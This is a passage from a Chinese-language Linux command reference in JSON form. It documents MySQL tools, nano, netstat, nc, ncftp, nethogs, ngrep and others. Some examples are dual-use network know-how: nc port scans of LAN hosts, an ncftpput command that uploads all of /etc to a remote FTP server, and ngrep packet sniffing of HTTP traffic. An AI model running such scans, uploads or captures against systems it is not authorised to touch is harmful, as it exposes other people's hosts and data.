新口令：将老密码改为新密码；\nping：检查mysqld是否活着；\nprocesslist：显示服务其中活跃线程列表；\nreload：重载授权表；\nrefresh：清空所有表并关闭和打开日志文件；\nshutdown：关掉服务器；\nstatus：给出服务器的简短状态消息；\nvariables：打印出可用变量；\nversion：得到服务器的版本信息。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mysqladmin"]},{"title":"【Linux 命令】mysqldump","url":"/linux-command/mysqldump/","content":"\nMySQL数据库中备份工具\n\n## 补充说明\n\n**mysqldump命令** 是mysql数据库中备份工具，用于将MySQL服务器中的数据库以标准的sql语言的方式导出，并保存到文件中。\n\n###  语法\n\n```shell\nmysqldump(选项)\n```\n\n###  选项\n\n```shell\n--add-drop-table：在每个创建数据库表语句前添加删除数据库表的语句；\n--add-locks：备份数据库表时锁定数据库表；\n--all-databases：备份MySQL服务器上的所有数据库；\n--comments：添加注释信息；\n--compact：压缩模式，产生更少的输出；\n--complete-insert：输出完成的插入语句；\n--databases：指定要备份的数据库；\n--default-character-set：指定默认字符集；\n--force：当出现错误时仍然继续备份操作；\n--host：指定要备份数据库的服务器；\n--lock-tables：备份前，锁定所有数据库表；\n--no-create-db：禁止生成创建数据库语句；\n--no-create-info：禁止生成创建数据库库表语句；\n--password：连接MySQL服务器的密码；\n--port：MySQL服务器的端口号；\n--user：连接MySQL服务器的用户名。\n```\n\n###  实例\n\n **导出整个数据库** \n\n```shell\nmysqldump -u 用户名 -p 数据库名 > 导出的文件名\nmysqldump -u linuxde -p smgp_apps_linuxde > linuxde.sql\n```\n\n **导出一个表** \n\n```shell\nmysqldump -u 用户名 -p 数据库名 表名> 导出的文件名\nmysqldump -u linuxde -p smgp_apps_linuxde users > linuxde_users.sql\n```\n\n **导出一个数据库结构** \n\n```shell\nmysqldump -u linuxde -p -d --add-drop-table smgp_apps_linuxde > linuxde_db.sql\n```\n\n`-d`没有数据，`--add-drop-tabl`e每个create语句之前增加一个`drop table`\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mysqldump"]},{"title":"【Linux 命令】mysqlimport","url":"/linux-command/mysqlimport/","content":"\n为MySQL服务器用命令行方式导入数据\n\n## 补充说明\n\n**mysqlimport命令** 为mysql数据库服务器提供了一种命令行方式导入数据工具，它从特定格式的文本文件中读取数据插入MySQL数据库表中。\n\n###  语法\n\n```shell\nmysqlimport(选项)(参数)\n```\n\n###  选项\n\n```shell\n-D：导入数据前清空表；\n-f：出现错误时继续处理剩余的操作；\n-h：MySQL服务器的ip地址或主机名；\n-u：连接MySQL服务器的用户名；\n-p：连接MySQL服务器的密码。\n```\n\n###  参数\n\n*   数据库名：指定要导入的数据库名称；\n*   文本文件：包含特定格式文本文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mysqlimport"]},{"title":"【Linux 命令】mysqlshow","url":"/linux-command/mysqlshow/","content":"\n显示MySQL中数据库相关信息\n\n## 补充说明\n\n**mysqlshow命令** 用于显示mysql服务器中数据库、表和列表信息。\n\n### 语法\n\n```shell\nmysqlshow(选项)(参数)\n```\n\n### 选项\n\n```shell\n-h：MySQL服务器的ip地址或主机名；\n-u：连接MySQL服务器的用户名；\n-p：连接MySQL服务器的密码；\n--count：显示每个数据表中数据的行数；\n-k：显示数据表的索引；\n-t：显示数据表的类型；\n-i：显示数据表的额外信息。\n```\n\n### 参数\n\n数据库信息：指定要显示的数据库信息，可以是一个数据库名，或者是数据库名和表名，或者是数据库名、表名和列名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mysqlshow"]},{"title":"【Linux 命令】named-checkzone","url":"/linux-command/named-checkzone/","content":"\n使用named-checkzone命令可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称\n\n## 补充说明\n\n**named-checkzone命令** 可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称。\n\n###  语法\n\n```shell\nnamed-checkzone [选项] [区域名] [区域文件名]\n```\n\n###  选项\n\n```shell\n-q 安静模式\n-d 启用调试\n-c <类别> 指定区域的类别。如果没指定就使用IN\n```\n\n### 例子\n\n对区域文件/var/named/192.168.0.rev进行有效性检查和转换。\n\n```shell\n[root@localhost ~]# named-checkzone 0.168.192.in-addr.arpa /var/named/192.168.0.rev\nzone0.168.192.in-addr.arpa/IN: loaded serial 1268360612\nOK\n```\n\n对区域文件/var/named/sh.com.hosts进行有效性检查和转换。\n\n```shell\n[root@localhost ~]#  named-checkzone sh.com /var/named/sh.com.hosts\nzonesh.com/IN: sh.com/MX 'mail.sh.com' is a CNAME (illegal)\nzonesh.com/IN: loaded serial 1268360234\nOK\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","named-checkzone"]},{"title":"【Linux 命令】nano","url":"/linux-command/nano/","content":"\n字符终端文本编辑器\n\n## 补充说明\n\n**nano** 是一个字符终端的文本编辑器，有点像DOS下的editor程序。它比vi/vim要简单得多，比较适合Linux初学者使用。某些Linux发行版的默认编辑器就是nano。\n\nnano命令可以打开指定文件进行编辑，默认情况下它会自动断行，即在一行中输入过长的内容时自动拆分成几行，但用这种方式来处理某些文件可能会带来问题，比如Linux系统的配置文件，自动断行就会使本来只能写在一行上的内容折断成多行了，有可能造成系统不灵了。因此，如果你想避免这种情况出现，就加上`-w`选项吧。\n\n###  语法\n\n```shell\nnano [选项] [[+行,列] 文件名]...\n```\n\n###  选项\n\n```shell\n -h, -?         --help                  显示此信息\n +行,列                                 从所指列数与行数开始\n -A             --smarthome             启用智能 HOME 键\n -B             --backup                储存既有文件的备份\n -C <目录>      --backupdir=<目录>      用以储存独一备份文件的目录\n -D             --boldtext              用粗体替代颜色反转\n -E             --tabstospaces          将已输入的制表符转换为空白\n -F             --multibuffer           启用多重文件缓冲区功能\n -H             --historylog            记录与读取搜索/替换的历史字符串\n -I             --ignorercfiles         不要参考nanorc 文件\n -K             --rebindkeypad          修正数字键区按键混淆问题\n -L             --nonewlines            不要将换行加到文件末端\n -N             --noconvert             不要从 DOS/Mac 格式转换\n -O             --morespace             编辑时多使用一行\n -Q <字符串>    --quotestr=<字符串>     引用代表字符串\n -R             --restricted            限制模式\n -S             --smooth                按行滚动而不是半屏\n -T <#列数>     --tabsize=<#列数>       设定制表符宽度为 #列数\n -U             --quickblank            状态行快速闪动\n -V             --version               显示版本资讯并离开\n -W             --wordbounds            更正确地侦测单字边界\n -Y <字符串>    --syntax=<字符串>       用于加亮的语法定义\n -c             --const                 持续显示游标位置\n -d             --rebinddelete          修正退格键/删除键混淆问题\n -i             --autoindent            自动缩进新行\n -k             --cut                   从游标剪切至行尾\n -l             --nofollow              不要依照符号连结，而是覆盖\n -m             --mouse                 启用鼠标功能\n -o <目录>      --operatingdir=<目录>   设定操作目录\n -p             --preserve              保留XON (^Q) 和XOFF (^S) 按键\n -q             --quiet                 沉默忽略启动问题, 比如rc 文件错误\n -r <#列数>     --fill=<#列数>          设定折行宽度为 #列数\n -s <程序>      --speller=<程序>        启用替代的拼写检查程序\n -t             --tempfile              离开时自动储存，不要提示\n -u             --undo                  允许通用撤销[试验性特性]\n -v             --view                  查看(只读)模式\n -w             --nowrap                不要自动换行\n -x             --nohelp                不要显示辅助区\n -z             --suspend               启用暂停功能\n -$             --softwrap              启用软换行\n -a, -b, -e,\n -f, -g, -j                             (忽略，为与pico 相容)\n```\n\n###  用法\n\n**光标控制** \n\n* 移动光标：使用用方向键移动。\n* 选择文字：按住鼠标左键拖到。\n\n**复制、剪贴和粘贴** \n\n* 复制一整行：Alt+6\n* 剪贴一整行：Ctrl+K\n\n**粘贴：Ctrl+U** \n\n如果需要复制／剪贴多行或者一行中的一部分，先将光标移动到需要复制／剪贴的文本的开头，按Ctrl+6（或者Alt+A）做标记，然后移动光标到 待复制／剪贴的文本末尾。这时选定的文本会反白，用Alt+6来复制，Ctrl+K来剪贴。若在选择文本过程中要取消，只需要再按一次Ctrl+6。\n\n**搜索** \n\n按Ctrl+W，然后输入你要搜索的关键字，回车确定。这将会定位到第一个匹配的文本，接着可以用Alt+W来定位到下一个匹配的文本。\n\n**翻页** \n\n* `Ctrl+Y` 到上一页\n* `Ctrl+V` 到下一页\n\n**保存** \n\n使用Ctrl+O来保存所做的修改\n\n**退出** \n\n按Ctrl+X\n\n如果你修改了文件，下面会询问你是否需要保存修改。输入Y确认保存，输入N不保存，按Ctrl+C取消返回。如果输入了Y，下一步会让你输入想要保存的文件名。如果不需要修改文件名直接回车就行；若想要保存成别的名字（也就是另存为）则输入新名称然后确 定。这个时候也可用Ctrl+C来取消返回。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nano"]},{"title":"【Linux 命令】nc","url":"/linux-command/nc/","content":"\n用于设置路由器，是网络工具中的瑞士军刀。\n\n## 补充说明\n\n**nc命令** 全称**netcat**，用于设置路由器。它能通过 TCP 和 UDP 在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用 netcat 命令所能完成的事情令人惊讶。\n\n###  语法\n\n```shell\nnc [-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>]\n[-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]\n```\n\n###  选项\n\n```shell\n-g <网关> # 设置路由器跃程通信网关，最多可设置8个。\n-G<指向器数目> # 设置来源路由指向器，其数值为4的倍数。\n-h 在线帮助。\n-i<延迟秒数> 设置时间间隔，以便传送信息及扫描通信端口。\n-l 使用监听模式，管控传入的资料。\n-n 直接使用IP地址，而不通过域名服务器。\n-o<输出文件> # 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。\n-p<通信端口> # 设置本地主机使用的通信端口。\n-r 乱数指定本地与远端主机的通信端口。\n-s<来源位址> # 设置本地主机送出数据包的IP地址。\n-u 使用UDP传输协议。\n-v 显示指令执行过程。\n-w<超时秒数> # 设置等待连线的时间。\n-z 使用0输入/输出模式，只在扫描通信端口时使用。\n```\n\n### 实例\n\nTCP端口扫描\n\n```shell\n[root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 \n192.168.0.3: inverse host lookup failed: Unknown host\n(UNKNOWN) [192.168.0.3] 80 (http) open\n(UNKNOWN) [192.168.0.3] 23 (telnet) open\n(UNKNOWN) [192.168.0.3] 22 (ssh) open\n```\n\n扫描192.168.0.3 的端口 范围是 1-100\n扫描UDP端口\n\n```shell\n[root@localhost ~]# nc -u -z -w2 192.168.0.1 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000\n```\n\n扫描指定端口\n\n```shell\n[root@localhost ~]# nc -nvv 192.168.0.1 80 # 扫描 80端口\n(UNKNOWN) [192.168.0.1] 80 (?) open\ny  //用户输入\n```\n\n查看从服务器到目的地的出站端口 443 是否被防火墙阻止\n\n```shell\nnc -vz acme-v02.api.letsencrypt.org 443 -w2\n# Ncat: Version 7.50 ( https://nmap.org/ncat )\n# Ncat: Connected to 23.77.214.183:443.\n# Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nc"]},{"title":"【Linux 命令】ncftp","url":"/linux-command/ncftp/","content":"\n是增强的的FTP工具\n\n## 补充说明\n\n**ncftp命令** 是增强的的ftp工具，比传统的FTP指令更加强大。FTP让用户得以下载存放于服务器主机的文件，也能将文件上传到远端主机放置。ncftp是文字模式FTP程序的佼佼者，它具备多样特色，包括显示传输速率，下载进度，自动续传，标住书签，可通过防火墙和代理服务器等。\n\n###  语法\n\n```shell\nncftp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-u：指定登录FTP服务器时使用的用户名；\n-p：指定登录FTP服务器时使用的密码；\n-P：如果FTP服务器没有使用默认的TCP协议的21端口，则使用此选项指定FTP服务器的端口号。\n-m：在传之前尝试在目录位置创建目录(用于传目录的情况)\n-R：递规传子目录\n```\n\n###  参数\n\nFTP服务器：指定远程FTP服务器的ip地址或主机名。\n\n###  安装\n\n```shell\nwget ftp://ftp.ncftp.com/ncftp/ncftp-3.2.3-src.tar.gz\ntar zxvf ncftp-3.2.3-src.tar.gz\ncd ncftp-3.2.3/\n./configure --prefix=/usr/local/ncftp\nmake && make install\n```\n\n###  实例\n\n将本地/etc/目录内的所有文件和目录，上传到FTP服务器的flv/games/目录内(如果不存在flv/games/目录则自动创建)。\n\n```shell\n/usr/local/ncftp/bin/ncftpput -u koumm -p koumm -P 21 -m -R 192.168.162.137  flv/games/ /etc/*\n```\n\n **指令说明** \n\nncftp的基本命令和普通ftp一样，可以输入help获得命令列表。对于所有的命令，都可以使用help <命令>的格式获得详细帮助。l开头的就是对本地执行的命令，其它的就是对登入的ftp服务目录的操作命令。\n\n增加的本地文件系统的操作命令：\n\n*   lls: 列出本地当前目录文件；\n*   lmkdir : 本地建立目录；\n*   lrename: 本地文件改名；\n*   lpwd: 显示当前本地路 径；\n*   lchmod: 改变本地文件权限；\n*   lpage: 显示本地文件内容；\n*   lrm: 删除本地文件；\n*   lrmdir: 删除本地目录。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ncftp"]},{"title":"【Linux 命令】nethogs","url":"/linux-command/nethogs/","content":"\n终端下的网络流量监控工具\n\n## 补充说明\n\n有很多适用于Linux系统的开源网络监视工具。比如说，你可以用命令iftop来检查带宽使用情况。netstat用来查看接口统计报告，还有top监控系统当前运行进程。但是如果你想要找一个能够按进程实时统计网络带宽利用率的工具，那么NetHogs值得一看。\n\n **NetHogs** 是一个开源的命令行工具（类似于Linux的top命令），用来按进程或程序实时统计网络带宽使用率。\n\n来自NetHogs项目网站:\n\n> NetHogs是一个小型的net top工具，不像大多数工具那样拖慢每个协议或者是每个子网的速度而是按照进程进行带宽分组。NetHogs不需要依赖载入某个特殊的内核模块。如果发生了网络阻塞你可以启动NetHogs立即看到哪个PID造成的这种状况。这样就很容易找出哪个程序跑飞了然后突然占用你的带宽。\n\n本文为你介绍如何在Unix/Linux操作系统下如何安装和使用NetHogs按进程监控网络带宽使用率。\n\n\n###  语法 \n\n```shell\nnethogs（选项）（参数）\n```\n###  选项 \n\n```shell\nusage: nethogs [-V] [-h] [-b] [-d seconds] [-v mode] [-c count] [-t] [-p] [-s] [device [device [device ...]]]\n  -V : 打印版本。\n  -h : 打印此帮助。\n  -b : bughunt模式 - 暗示tracemode。\n  -d : 延迟更新刷新率（以秒为单位）。 默认值为1。\n  -v : 视图模式（0 = KB / s，1 =总KB，2 =总B，3 =总MB）。 默认值为0。\n  -c : 更新次数。 默认为0（无限制）。\n  -t : tracemode.\n  -p : 煽动混乱模式（不推荐）。\n  -s : 按发送列排序输出。\n  -a : 监控所有设备，甚至环回/停止。\n  device : 要监控的设备。 默认是所有接口启动和运行，不包括环回\n\n当nethogs运行时，按：\n  q：退出\n  s：按SENT流量排序\n  r：按RECEIVE流量排序\n  m：在总（KB，B，MB）和KB / s模式之间切换\n```\n\n其他参数和用法\n\n```shell\n-d : 刷新间隔\n-h : 帮助\n-p : promiscious 模式\n-t : trace模式 \n-V : 版本\n```\n\n**交互命令**\n\n以下是NetHogs的一些交互命令（键盘快捷键）\n\n*   m : 修改单位\n*   r : 按流量排序\n*   s : 按发送流量排序\n*   q : 退出命令提示符\n\n### 安装\n\n**在RHEL、CentOS和Fedora下安装NetHogs**\n\n要安装NetHogs，你必须要启用你所用Linux下的EPEL源。然后运行下面的yum命令下载安装NetHogs包。\n\n```shell\nyum install nethogs\n```\n\n**在Ubuntu、Linux mint和Debian下安装NetHogs**\n\n键入apt-get命令安装NetHogs包：\n\n```shell\n$ sudo apt-get install nethogs\n```\n\n###  NetHogs用法 \n\n在基于RedHat系统下键入如下命令启动NetHogs工具。\n\n```shell\nnethogs\n```\n\n在Debian/Ubuntu/Linux Mint下要执行NetHogs你必须拥有root权限：\n\n```shell\n$ sudo nethogs\n```\n\n!nethogs\n\nUbuntu 12.10 下的NetHogs预览\n\n正如上图所示，send列和received列显示的是按照每个进程的流量统计。总的收发数据带宽在最下方，而且可以用交互命令控制排序，下面将要讨论这些交互命令。\n\n###  NetHogs 命令行参数 \n\n以下就是NetHogs命令行的参数，用-d来添加刷新频率参数，device name 用来检测给定的某个或者某些设备的带宽（默认是eth0）。例如：设置5秒钟的刷新频率，键入如下命令即可：\n\n```shell\nnethogs -d 5\n```\n\n```shell\n$ sudo nethogs -d 5\n```\n\n如果只用来监视设备（eth0）的网络带宽可以使用如下命令：\n\n```shell\nnethogs eth0\n```\n\n```shell\n$ sudo nethogs eth0\n```\n\n如果要同时监视eth0和eth1接口，使用以下命令即可：\n\n```shell\nnethogs eth0 eth1\n```\n\n```shell\n$ sudo nethogs eth0 eth1\n\n```\n\n关于NetHogs命令行工具的完整参数列表，可以参考NetHogs的手册，使用方法是在终端里输入`man nethogs`或者`sudo man nethogs`，更多信息请参考NetHogs项目主页。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nethogs"]},{"title":"【Linux 命令】netstat","url":"/linux-command/netstat/","content":"\n查看Linux中网络系统状态信息\n\n## 补充说明\n\n**netstat命令** 用来打印Linux中网络系统的状态信息，可让你得知整个Linux系统的网络情况。\n\n###  语法 \n\n```shell\nnetstat(选项)\n```\n\n###  选项 \n\n```shell\n-a或--all：显示所有连线中的Socket；\n-A<网络类型>或--<网络类型>：列出该网络类型连线中的相关地址；\n-c或--continuous：持续列出网络状态；\n-C或--cache：显示路由器配置的快取信息；\n-e或--extend：显示网络其他相关信息；\n-F或--fib：显示FIB；\n-g或--groups：显示多重广播功能群组组员名单；\n-h或--help：在线帮助；\n-i或--interfaces：显示网络界面信息表单；\n-l或--listening：显示监控中的服务器的Socket；\n-M或--masquerade：显示伪装的网络连线；\n-n或--numeric：直接使用ip地址，而不通过域名服务器；\n-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；\n-o或--timers：显示计时器；\n-p或--programs：显示正在使用Socket的程序识别码和程序名称；\n-r或--route：显示Routing Table；\n-s或--statistice：显示网络工作信息统计表；\n-t或--tcp：显示TCP传输协议的连线状况；\n-u或--udp：显示UDP传输协议的连线状况；\n-v或--verbose：显示指令执行过程；\n-V或--version：显示版本信息；\n-w或--raw：显示RAW传输协议的连线状况；\n-x或--unix：此参数的效果和指定\"-A unix\"参数相同；\n--ip或--inet：此参数的效果和指定\"-A inet\"参数相同。\n```\n\n###  实例 \n\n **列出所有端口 (包括监听和未监听的)** \n\n```shell\nnetstat -a     #列出所有端口\nnetstat -at    #列出所有tcp端口\nnetstat -au    #列出所有udp端口                             \n```\n\n **列出所有处于监听状态的 Sockets** \n\n```shell\nnetstat -l        #只显示监听端口\nnetstat -lt       #只列出所有监听 tcp 端口\nnetstat -lu       #只列出所有监听 udp 端口\nnetstat -lx       #只列出所有监听 UNIX 端口\n```\n\n **显示每个协议的统计信息** \n\n```shell\nnetstat -s   显示所有端口的统计信息\nnetstat -st   显示TCP端口的统计信息\nnetstat -su   显示UDP端口的统计信息\n\n​```shell\n\n **在netstat输出中显示 PID 和进程名称** \n\n​```shell\nnetstat -pt\n```\n\n`netstat -p`可以与其它开关一起使用，就可以添加“PID/进程名称”到netstat输出中，这样debugging的时候可以很方便的发现特定端口运行的程序。\n\n **在netstat输出中不显示主机，端口和用户名(host, port or user)** \n\n当你不想让主机，端口和用户名显示，使用`netstat -n`。将会使用数字代替那些名称。同样可以加速输出，因为不用进行比对查询。\n\n```shell\nnetstat -an\n```\n\n如果只是不想让这三个名称中的一个被显示，使用以下命令:\n\n```shell\nnetsat -a --numeric-ports\nnetsat -a --numeric-hosts\nnetsat -a --numeric-users\n```\n\n **持续输出netstat信息** \n\n```shell\nnetstat -c   #每隔一秒输出网络信息\n```\n\n **显示系统不支持的地址族(Address Families)** \n\n```shell\nnetstat --verbose\n```\n\n在输出的末尾，会有如下的信息：\n\n```shell\nnetstat: no support for `AF IPX' on this system.\nnetstat: no support for `AF AX25' on this system.\nnetstat: no support for `AF X25' on this system.\nnetstat: no support for `AF NETROM' on this system.\n```\n\n **显示核心路由信息** \n\n```shell\nnetstat -r\n```\n\n使用`netstat -rn`显示数字格式，不查询主机名称。\n\n **找出程序运行的端口** \n\n并不是所有的进程都能找到，没有权限的会不显示，使用 root 权限查看所有的信息。\n\n```shell\nnetstat -ap | grep ssh\n```\n\n找出运行在指定端口的进程：\n\n```shell\nnetstat -an | grep ':80'\n```\n\n **通过端口找进程ID**\n\n```bash\nnetstat -anp|grep 8081 | grep LISTEN|awk '{printf $7}'|cut -d/ -f1\n```\n\n **显示网络接口列表** \n\n```shell\nnetstat -i\n```\n\n显示详细信息，像是ifconfig使用`netstat -ie`。\n\n **IP和TCP分析** \n\n查看连接某服务端口最多的的IP地址：\n\n```shell\nnetstat -ntu | grep :80 | awk '{print $5}' | cut -d: -f1 | awk '{++ip[$1]} END {for(i in ip) print ip[i],\"\\t\",i}' | sort -nr\n```\n\nTCP各种状态列表：\n\n```shell\nnetstat -nt | grep -e 127.0.0.1 -e 0.0.0.0 -e ::: -v | awk '/^tcp/ {++state[$NF]} END {for(i in state) print i,\"\\t\",state[i]}'\n```\n\n查看phpcgi进程数，如果接近预设值，说明不够用，需要增加：\n\n```shell\nnetstat -anpo | grep \"php-cgi\" | wc -l\n```\n\n## 扩展知识 \n\n### 网络连接状态详解\n\n**共有12中可能的状态**，前面11种是按照TCP连接建立的三次握手和TCP连接断开的四次挥手过程来描述的：\n\n1. LISTEN：首先服务端需要打开一个socket进行监听，状态为 LISTEN，侦听来自远方TCP端口的连接请求 ；\n\n2. SYN_SENT：客户端通过应用程序调用connect进行active open，于是客户端tcp发送一个SYN以请求建立一个连接，之后状态置为 SYN_SENT，在发送连接请求后等待匹配的连接请求；\n\n3. SYN_RECV：服务端应发出ACK确认客户端的 SYN，同时自己向客户端发送一个SYN，之后状态置为，在收到和发送一个连接请求后等待对连接请求的确认；\n\n4. ESTABLISHED：代表一个打开的连接，双方可以进行或已经在数据交互了， 代表一个打开的连接，数据可以传送给用户；\n\n5. FIN_WAIT1：主动关闭(active close)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态， 等待远程TCP的连接中断请求，或先前的连接中断请求的确认；\n\n6. CLOSE_WAIT：被动关闭(passive close)端TCP接到FIN后，就发出ACK以回应FIN请求(它的接收也作为文件结束符传递给上层应用程序)，并进入CLOSE_WAIT， 等待从本地用户发来的连接中断请求；\n\n7. FIN_WAIT2：主动关闭端接到ACK后，就进入了 FIN-WAIT-2，从远程TCP等待连接中断请求；\n\n8. LAST_ACK：被动关闭端一段时间后，接收到文件结束符的应用程 序将调用CLOSE关闭连接，这导致它的TCP也发送一个 FIN,等待对方的ACK.就进入了LAST-ACK，等待原来发向远程TCP的连接中断请求的确认；\n\n9. TIME_WAIT:在主动关闭端接收到FIN后，TCP 就发送ACK包，并进入TIME-WAIT状态，等待足够的时间以确保远程TCP接收到连接中断请求的确认；\n\n10. CLOSING: 比较少见，等待远程TCP对连接中断的确认；\n\n11. CLOSED: 被动关闭端在接受到ACK包后，就进入了closed的状态，连接结束，没有任何连接状态；\n\n12. UNKNOWN：未知的Socket状态；\n\n**常见标志位**\n\n* SYN: (同步序列编号,Synchronize Sequence Numbers)该标志仅在三次握手建立TCP连接时有效。表示一个新的TCP连接请求。\n\n* ACK: (确认编号,Acknowledgement Number)是对TCP请求的确认标志,同时提示对端系统已经成功接收所有数据。\n\n* FIN: (结束标志,FINish)用来结束一个TCP回话.但对应端口仍处于开放状态,准备接收后续数据。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","netstat"]},{"title":"【Linux 命令】newusers","url":"/linux-command/newusers/","content":"\n用于批处理的方式一次创建多个命令\n\n## 补充说明\n\n**newusers命令** 用于批处理的方式一次创建多个命令。\n\n###  语法\n\n```shell\nnewusers(参数)\n```\n\n###  参数\n\n用户文件：指定包含用户信息的文本文件，文件的格式要与`/etc/passwd`相同。\n\n###  实例\n\n实用newusers命令批量添加用户：\n\n用法很简单，newusers后面直接跟一个文件，文件格式和`/etc/passwd`的格式相同。\n\n```shell\n用户名1:x:UID:GID:用户说明:用户的家目录:所用SHELL\n```\n\n举例：\n\n```shell\njingang0:x:520:520::/home/jingang0:/sbin/nologin\njingang1:x:521:521::/home/jingang1:/sbin/nologin\n......\n```\n\n值得一提的是关于SHELL类型，查看主机上所有SHELL，可以通过chsh来查看：\n\n```shell\n[root@localhost beinan]# chsh --list\n/bin/sh\n/bin/bash\n/sbin/nologin\n/bin/ksh\n/bin/tcsh\n/bin/csh\n/bin/zsh\n```\n\n其中除了`/sbin/nologin`，其它类型的SHELL都能登录系统，nologin大多是虚拟用户用的SHELL，也就是说虽然他是系统用户，但他并无登录系统的权限；如果您想添加这类用户，就把他的SHELL设置成`/sbin/nologin`，比如上面的例子。\n\n关于用户名、UID、GID及用户的家目录是怎么回事，您可以读相应的参考文档。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","newusers"]},{"title":"【Linux 命令】nfsstat","url":"/linux-command/nfsstat/","content":"\n列出NFS客户端和服务器的工作状态\n\n## 补充说明\n\n**nfsstat命令** 用于列出NFS客户端和服务器的工作状态。\n\n###  语法\n\n```shell\nnfsstat(选项)\n```\n\n###  选项\n\n```shell\n-s：仅列出NFS服务器端状态；\n-c：仅列出NFS客户端状态；\n-n：仅列出NFS状态，默认显示nfs客户端和服务器的状态；\n-2：仅列出NFS版本2的状态；\n-3：仅列出NFS版本3的状态；\n-4：仅列出NFS版本4的状态；\n-m：打印以加载的nfs文件系统状态；\n-r：仅打印rpc状态。\n```\n\n###  实例\n\n要显示关于客户机发送和拒绝的RPC和NFS调用数目的信息，输入：\n\n```shell\nnfsstat -c\n```\n\n要显示和打印与客户机NFS调用相关的信息，输入如下命令：\n\n```shell\nnfsstat -cn\n```\n\n要显示和打印客户机和服务器的与RPC调用相关的信息，输入如下命令：\n\n```shell\nnfsstat -r\n```\n\n要显示关于服务器接收和拒绝的RPC和NFS调用数目的信息，输入如下命令：\n\n```shell\nnfsstat –s\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nfsstat"]},{"title":"【Linux 命令】ngrep","url":"/linux-command/ngrep/","content":"\n方便的数据包匹配和显示工具\n\n## 补充说明\n\n**ngrep命令** 是grep命令的网络版，他力求更多的grep特征，用于搜寻指定的数据包。正由于安装ngrep需用到libpcap库， 所以支持大量的操作系统和网络协议。能识别TCP、UDP和ICMP包，理解bpf的过滤机制。\n\n###  安装\n\nngrep命令的下载地址：http://ngrep.sourceforge.net/，libpcap下载地址：http://www.tcpdump.org/。先用`yum install libpcap`完全安装libpcap，注意有时候用libpcap安装包安装的不完整会影响ngrep的使用。\n\n如果yum无法安装就用以下步骤安装libpcap：\n\n```shell\nwget http://www.tcpdump.org/release/libpcap-1.3.0.tar.gz\ntar -zxf libpcap-1.3.0.tar.gz\ncd libpcap-1.3.0\n./configure\nmake && make install\n```\n\nngrep的安装就是 configure/make/make install 三部曲。\n\n注：configure时是遇到 please wipe out all unused pcap installations，添加以下选项：\n\n```shell\n./configure --with-pcap-includes=/usr/local/include/pcap\n```\n\n在安装后输入ngrep来验证下安装是否成功。\n\n###  语法\n\n```shell\nngrep <-LhNXViwqpevxlDtTRM> <-IO pcap_dump> <-n num> <-d dev> <-A num>\n<-s snaplen> <-S limitlen> <-w normal|byline|single|none> <-c cols>\n<-P char> <-F file> <match expression> <bpf filter>\n```\n\n###  选项\n\n```shell\n-e # 显示空数据包\n-i # 忽略大小写\n-v # 反转匹配\n-R # don't do privilege revocation logic\n-x # 以16进制格式显示\n-X # 以16进制格式匹配\n-w # 整字匹配\n-p # 不使用混杂模式\n-l # make stdout line buffered\n-D # replay pcap_dumps with their recorded time intervals\n-t # 在每个匹配的包之前显示时间戳\n-T # 显示上一个匹配的数据包之间的时间间隔\n-M # 仅进行单行匹配\n-I # 从文件中读取数据进行匹配\n-O # 将匹配的数据保存到文件\n-n # 仅捕获指定数目的数据包进行查看\n-A # 匹配到数据包后dump随后的指定数目的数据包\n-s # set the bpf caplen\n-S # set the limitlen on matched packets\n-W # 设置显示格式byline将解析包中的换行符\n-c # 强制显示列的宽度\n-P # set the non-printable display char to what is specified\n-F # 使用文件中定义的bpf(Berkeley Packet Filter)\n-N # 显示由IANA定义的子协议号\n-d # 使用哪个网卡，可以用-L选项查询\n-L # 查询网卡接口\n```\n\n###  实例\n\n捕捉cloudian：18080端口的request和response，`-W byline`用来解析包中的换行符，否则包里的所有数据都是连续的，可读性差。`-d lo`是监听本地网卡：\n\n```shell\nngrep -W byline -d lo port 18080\n```\n\n捕捉amazon：80端口的request和response。`-d eth0是`用来监听对外的网卡：\n\n```shell\nngrep -W byline -d eth0 port 80\n```\n\n可以用`-d any`来捕捉所有的包：\n\n```shell\nngrep '[a-zA-Z]' -t -W byline -d any tcp port 18080\n```\n\n捕获字符串`.flv`，比如要查看在Web Flash 视频中的.flv文件的下载地址：\n\n```shell\nngrep -d3 -N -q \\.flv\ninterface: \\Device\\TNT_40_1_{670F6B50-0A13-4BAB-9D9E-994A833F5BA9} (10.132.0.0/2\n55.255.192.0)\nmatch: \\.flv\n```\n\n打开一个视频页面：\n\n```shell\nT(6) 10.132.34.23:24860 -> 61.142.208.154:80 [AP]\nGET /f59.c31.56.com/flvdownload/12/19/ggyg7741@56.com_56flv_zhajm_119556973\n97.flv HTTP/1.1..accept: */*..Referer: http://www.56.com/flashApp/v_player_\nsite.swf..x-flash-version: 9,0,45,0..UA-CPU: x86..Accept-Encoding: gzip, de\nflate..User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET\nCLR 